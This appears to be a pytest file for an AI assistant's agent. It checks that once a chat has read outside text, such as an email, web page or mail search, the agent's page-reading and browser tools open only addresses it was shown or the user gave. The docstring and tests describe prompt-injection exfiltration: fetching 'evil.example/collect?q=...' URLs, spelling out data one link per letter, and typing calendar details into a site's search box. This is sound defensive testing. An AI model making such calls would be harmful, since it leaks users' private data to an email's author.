"""A conversation the user is in opens only the pages it was shown, once it
has read text from outside.

Only a run nobody watched kept to the pages it was shown (`core/egress.py`
`unseen`). In the app's chat, a model fooled by an email could open
`https://evil.example/?q=<what it read>`, and nothing stopped it (step 10b).
Now an email, a page, a mail or Drive search, or a lookup of someone in the
people ledger marks the conversation
(agent/screening.py `Reading`) for the rest of it, and `read_page` keeps
to what it was shown (agent/toolset/web.py `unshown`): what it searched up,
the addresses that came whole in what it read, and the user's own words.
The browser keeps to the same addresses, and its search box to the user's
own words (agent/toolset/browser.py).

Each model here is a FunctionModel behind the real `build_agent`, so its
tools are the ones a live chat is offered; the mail is a fake account and
the pages are fakes.
"""

from __future__ import annotations

from types import SimpleNamespace

import pytest
from pydantic_ai.messages import ModelResponse, TextPart, ToolCallPart, ToolReturnPart
from pydantic_ai.models.function import AgentInfo, FunctionModel

import agent.loop as loop
from agent import screening
from agent.loop import Conversation
from steve_sdk.classes import Message
from tests import persona
from tests.gate.mailfake import Mailbox, connect
from tools import web

AGENDA = "https://tailspin.example/agenda"
EVIL = "https://evil.example/collect?q=tuesday"
EMAIL = Message(native_id="m1", thread="t1", sender="Iris Novak <iris_novak@tailspin.example>",
                subject="Tuesday", body=f"The agenda is at {AGENDA}. Could you confirm?",
                when=1)
NEWS = "https://news.example/a"
PAGES = {NEWS: "Today's news. More at https://news.example/b."}


@pytest.fixture
def store(memories_repo, store):
    return store


@pytest.fixture
def chat(monkeypatch):
    """A model that makes the calls a test lines up (`steps`), one at a
    time, then answers; what each call returned, and every address really
    fetched."""
    state = SimpleNamespace(steps=[], returned=[], fetched=[])

    def respond(messages, info: AgentInfo) -> ModelResponse:
        state.returned += [p.content for p in messages[-1].parts
                           if isinstance(p, ToolReturnPart)]
        if info.function_tools and state.steps:
            name, args = state.steps.pop(0)
            return ModelResponse(parts=[ToolCallPart(name, args)])
        return ModelResponse(parts=[TextPart("Done.")])

    async def fetch(url, **kwargs):
        state.fetched.append(url)
        return web.PageContent(url=url, title="Page", text=PAGES.get(url, "A page."))

    async def search(query, count=5, **kwargs):
        return [web.SearchResult(title="News", url=NEWS, description="Today's news")]

    monkeypatch.setattr(loop, "model_for", lambda role: FunctionModel(respond))
    monkeypatch.setattr(web, "fetch", fetch)
    monkeypatch.setattr(web, "search", search)
    return state


@pytest.fixture
def gmail(monkeypatch):
    return connect(monkeypatch, gmail=Mailbox(persona.EMAIL, EMAIL))["gmail"]


async def _turn(convo, chat, text, *steps):
    chat.steps = list(steps)
    chat.returned.clear()
    await convo.send(text)
    assert not chat.steps, f"the model never made {chat.steps}"
    return list(chat.returned)


def _page(url):
    return ("read_page", {"url": url})


async def test_after_an_email_is_read_a_chat_opens_no_address_it_was_not_shown(
        store, chat, gmail):
    """In that turn and the next: the next still has the email in front of
    the model."""
    convo = Conversation(store, channel="signal")

    *_, refused = await _turn(convo, chat, "What did Iris send?",
                              ("read_email", {"message_id": gmail.id("m1")}), _page(EVIL))
    [later] = await _turn(convo, chat, "Thanks, anything else?",
                          _page("https://evil.example/collect?q=agenda"))

    assert chat.fetched == []
    assert "has read text from outside" in refused["error"]
    assert "has read text from outside" in later["error"]
    assert "nobody is watching" not in refused["error"], "they are watching"


async def test_a_link_that_came_whole_in_the_email_is_opened_that_turn_and_the_next(
        store, chat, gmail):
    """It carries nothing of theirs: its sender wrote it before the model
    read anything."""
    convo = Conversation(store, channel="signal")

    await _turn(convo, chat, "What did Iris send?",
                ("read_email", {"message_id": gmail.id("m1")}), _page(AGENDA))
    await _turn(convo, chat, "Open the agenda again", _page(AGENDA))

    assert chat.fetched == [AGENDA, AGENDA]


async def test_a_link_the_user_pastes_after_an_email_is_opened(store, chat, gmail):
    convo = Conversation(store, channel="signal")
    theirs = "https://lindqvist.example/notes"

    await _turn(convo, chat, "What did Iris send?",
                ("read_email", {"message_id": gmail.id("m1")}))
    await _turn(convo, chat, f"Now read {theirs}, please.", _page(theirs))

    assert chat.fetched == [theirs]


async def test_a_chat_that_has_only_searched_the_web_opens_any_address(store, chat):
    """Search results are the sites' titles and snippets, read before
    anything of theirs: nothing of the user's is in front of the model."""
    convo = Conversation(store, channel="signal")

    await _turn(convo, chat, "What's in the news?",
                ("web_search", {"query": "news"}), _page("https://elsewhere.example/"))

    assert chat.fetched == ["https://elsewhere.example/"]


async def test_a_page_read_marks_the_chat_and_its_own_links_and_the_search_stay_open(
        store, chat):
    convo = Conversation(store, channel="signal")

    await _turn(convo, chat, "What's in the news?",
                ("web_search", {"query": "news"}), _page(NEWS), _page(EVIL))
    await _turn(convo, chat, "And the rest?", _page("https://news.example/b"), _page(NEWS))

    assert chat.fetched == [NEWS, "https://news.example/b", NEWS]


async def test_a_mail_search_marks_the_chat(store, chat, gmail):
    """Its subjects and snippets are their senders' words, read without
    the screen."""
    convo = Conversation(store, channel="signal")

    *_, refused = await _turn(convo, chat, "Anything from Iris?",
                              ("search_email", {"query": "from:iris"}), _page(EVIL))

    assert chat.fetched == [] and "has read text from outside" in refused["error"]
    assert convo.reading.read


async def test_a_drive_search_marks_the_chat(store, chat, monkeypatch):
    """A file's name is whoever shared it's words (step 11's audit)."""
    from steve_sdk.classes import FileItem
    from tests.gate import slotfake

    slotfake.plug(monkeypatch, "files", google=slotfake.Drive(
        FileItem(native_id="d1", name="Lease 2026", text="Rent.")))
    convo = Conversation(store, channel="signal")

    *_, refused = await _turn(convo, chat, "Find the lease",
                              ("search_drive", {"query": "lease"}), _page(EVIL))

    assert chat.fetched == [] and "has read text from outside" in refused["error"]


async def test_a_lookup_in_the_people_ledger_marks_the_chat(store, chat):
    """A person's name and their mail's subjects are their words (step 11's
    audit)."""
    from tools import people

    person = people.upsert(store, "iris_novak@tailspin.example", name="Iris Novak")
    people.record_interaction(store, person, kind="email", direction="received",
                              source_id="m1", occurred_at="2026-10-12T09:00:00",
                              subject="Tuesday")
    convo = Conversation(store, channel="signal")

    *_, refused = await _turn(convo, chat, "Who is Iris?",
                              ("who_is", {"query": "tailspin"}), _page(EVIL))

    assert chat.fetched == [] and "has read text from outside" in refused["error"]


async def test_the_mark_outlasts_a_restart_of_the_worker(store, chat, gmail):
    """The worker restarts often, and a chat's conversation is made again
    from its session: the email is still in what the next turn reads."""
    first = Conversation(store, channel="signal")
    await _turn(first, chat, "What did Iris send?",
                ("read_email", {"message_id": gmail.id("m1")}))

    again = Conversation(store, channel="signal", session_id=first.session_id)
    [refused] = await _turn(again, chat, "Open that link", _page(EVIL))

    assert again.reading.read and not Conversation(store, channel="signal").reading.read
    assert chat.fetched == [] and "has read text from outside" in refused["error"]


async def test_a_run_nobody_watches_still_never_opens_a_link_from_what_it_read(store, chat):
    """Its rule is the stricter one, as before: only what a search returned
    or the user's note named."""
    convo = Conversation(store, channel="job")

    *_, refused = await _turn(convo, chat, "Summarise the news",
                              ("web_search", {"query": "news"}), _page(NEWS),
                              _page("https://news.example/b"))

    assert chat.fetched == [NEWS]
    assert "nobody is watching" in refused["error"]


async def test_outside_a_conversation_reading_marks_nothing():
    """The attention sources screen in threads of their own, with no
    conversation in hand."""
    screening.note("email_body", f"see {AGENDA}")

    assert screening.reading.get() is None and not screening.has_read()


# One link per letter, each on a host of its own under one site.
SPELLING = [f"https://{c}.evil.example/{c}" for c in "abcde"]
LETTERS = Message(native_id="m2", thread="t2", sender="Iris Novak <iris_novak@tailspin.example>",
                  subject="Links", body=" ".join(SPELLING) + f" and the agenda: {AGENDA}",
                  when=2)


@pytest.fixture
def letters(monkeypatch):
    return connect(monkeypatch, gmail=Mailbox(persona.EMAIL, LETTERS))["gmail"]


async def test_a_chat_opens_three_links_that_came_whole_on_one_site_then_asks(
        store, chat, letters):
    """A page or an email listing a link per letter spells out what the
    chat read in the order the model opens them, each address one that
    came whole (step 11's audit, A6). Three on a site, then the user is
    asked; a link opened before, and another site's, are still free."""
    convo = Conversation(store, channel="signal")

    *_, refused = await _turn(convo, chat, "What did Iris send?",
                              ("read_email", {"message_id": letters.id("m2")}),
                              *[_page(url) for url in SPELLING[:4]])
    await _turn(convo, chat, "And the agenda?", _page(SPELLING[0]), _page(AGENDA))

    assert chat.fetched == [*SPELLING[:3], SPELLING[0], AGENDA]
    assert "allow_links(site='evil.example')" in refused["error"]


async def test_after_their_yes_to_a_site_the_chat_opens_more_of_its_links(
        store, chat, letters):
    from agent.toolset import web as web_tools

    convo = Conversation(store, channel="signal")
    *_, card = await _turn(convo, chat, "What did Iris send?",
                           ("read_email", {"message_id": letters.id("m2")}),
                           *[_page(url) for url in SPELLING[:3]],
                           ("allow_links", {"site": "evil.example"}))
    assert card["status"] == "awaiting_approval"

    await web_tools._do_allow_links(session=convo.session_id, site="evil.example")
    await _turn(convo, chat, "Go on", *[_page(url) for url in SPELLING[3:]])

    assert chat.fetched == SPELLING


async def test_a_link_the_user_pastes_counts_against_no_site(store, chat, letters):
    convo = Conversation(store, channel="signal")
    theirs = "https://lindqvist.evil.example/notes"

    await _turn(convo, chat, "What did Iris send?",
                ("read_email", {"message_id": letters.id("m2")}),
                *[_page(url) for url in SPELLING[:3]])
    await _turn(convo, chat, f"Read {theirs} and {SPELLING[3]}, please.",
                _page(theirs), _page(SPELLING[3]))

    assert chat.fetched == [*SPELLING[:3], theirs, SPELLING[3]]


# --------------------------------------------------------------------------
# The browser keeps the same rule
# --------------------------------------------------------------------------

MINUTES = "https://tailspin.example/minutes"
ELEMENTS = {
    "e1": {"ref": "e1", "tag": "a", "label": "Minutes", "href": MINUTES},
    "e2": {"ref": "e2", "tag": "input", "type": "search", "label": "Search"},
    # Put on the page after it was read: no read showed it.
    "e3": {"ref": "e3", "tag": "a", "label": "More", "href": EVIL},
}


class _Page:
    """The browser's sandbox as the tools see it: the agenda, with a link
    to its minutes and a search box, and every command it was sent."""

    site, domains, steps, dead = "", (), 1, ""

    def __init__(self):
        self.box = SimpleNamespace(session="s1")
        self.asked: list[tuple[str, dict]] = []
        self.url = ""

    async def ask(self, cmd, **args):
        self.asked.append((cmd, args))
        self.url = args.get("url", self.url)
        said = {"ok": True, "url": self.url, "title": "Agenda"}
        if cmd == "read":
            said.update(text="Tuesday's agenda.", elements=[ELEMENTS["e1"], ELEMENTS["e2"]])
        if cmd == "describe":
            said.update(button=ELEMENTS[args["button"]], fields=[], payment=None)
        return said

    def sent(self, cmd):
        return [args for asked, args in self.asked if asked == cmd]


@pytest.fixture
def browser(monkeypatch):
    import core.browser
    from agent.browser import session as sessions
    from agent.toolset import browser as tools
    from core.browser import vault

    page = _Page()

    async def session_for(conversation, site=None, *, domains=()):
        return page

    saved = SimpleNamespace(site_for=lambda url: None, site=lambda name: None,
                            sites=lambda: [], listed=lambda: [])
    monkeypatch.setattr(core.browser, "enabled", lambda: True)
    monkeypatch.setattr(sessions, "session_for", session_for)
    monkeypatch.setattr(sessions, "current", lambda conversation: page if page.url else None)
    monkeypatch.setattr(vault, "vault", lambda: saved)
    monkeypatch.setattr(tools.egress, "refusal", lambda url: None)
    return page


async def test_a_chat_that_has_read_nothing_opens_an_address_the_model_wrote(
        store, chat, browser):
    convo = Conversation(store, channel="signal")

    [opened] = await _turn(convo, chat, "Look up the minutes", ("browse_open", {"url": EVIL}))

    assert opened["ok"] and browser.sent("open") == [{"url": EVIL}]


async def test_after_an_email_is_read_the_browser_opens_no_address_it_was_not_shown(
        store, chat, gmail, browser):
    """As `read_page` does. Until step 11's audit the browser opened any
    address in a chat that had read an email, so the email's author could
    have it carry what the chat held. The agenda came whole in the email."""
    convo = Conversation(store, channel="signal")

    _, refused, opened = await _turn(convo, chat, "What did Iris send?",
                                     ("read_email", {"message_id": gmail.id("m1")}),
                                     ("browse_open", {"url": EVIL}),
                                     ("browse_open", {"url": AGENDA}))

    assert "has read text from outside" in refused["error"] and opened["ok"]
    assert [args["url"] for args in browser.sent("open")] == [AGENDA]


async def test_after_an_email_is_read_a_click_follows_only_a_link_on_a_page_it_read(
        store, chat, gmail, browser):
    """A link on a page the screen passed came whole, as one in an email
    does. One the page put there after it was read did not, and a click
    on a page with no saved login followed it with nothing asked."""
    convo = Conversation(store, channel="signal")

    *_, followed, refused = await _turn(
        convo, chat, "What did Iris send?", ("read_email", {"message_id": gmail.id("m1")}),
        ("browse_open", {"url": AGENDA}), ("browse_read", {}),
        ("browse_click", {"ref": "e1"}), ("browse_click", {"ref": "e3"}))

    assert followed["ok"] and "has read text from outside" in refused["error"]
    assert browser.sent("click") == [{"ref": "e1"}]


async def test_a_link_on_a_page_the_screen_withheld_is_not_followed(
        store, chat, gmail, browser, monkeypatch):
    """The page read as instructions: its links are its author's choice,
    and the model was not shown the words around them."""
    from core import screen

    def read(conn, artifact):
        if artifact.source == "browser_page":
            return screen.Shown("", "withheld")
        return screen.Shown(artifact.text, "text")

    monkeypatch.setattr(screening, "_read", read)
    convo = Conversation(store, channel="signal")

    *_, refused = await _turn(
        convo, chat, "What did Iris send?", ("read_email", {"message_id": gmail.id("m1")}),
        ("browse_open", {"url": AGENDA}), ("browse_read", {}), ("browse_click", {"ref": "e1"}))

    assert "has read text from outside" in refused["error"] and browser.sent("click") == []


async def test_after_an_email_is_read_a_sites_search_box_takes_only_the_users_own_words(
        store, chat, gmail, browser):
    """A page can call any field its search box, and what is typed there
    goes to its site: "Dentist Thursday 3pm", from their calendar, would
    have gone to whoever wrote the email."""
    convo = Conversation(store, channel="signal")

    *_, refused, searched = await _turn(
        convo, chat, "Search Iris's agenda for the budget slides",
        ("read_email", {"message_id": gmail.id("m1")}), ("browse_open", {"url": AGENDA}),
        ("browse_search", {"ref": "e2", "text": "Dentist Thursday 3pm"}),
        ("browse_search", {"ref": "e2", "text": "Budget slides"}))

    assert "user's own words" in refused["error"] and searched["ok"]
    assert [args["text"] for args in browser.sent("search")] == ["Budget slides"]
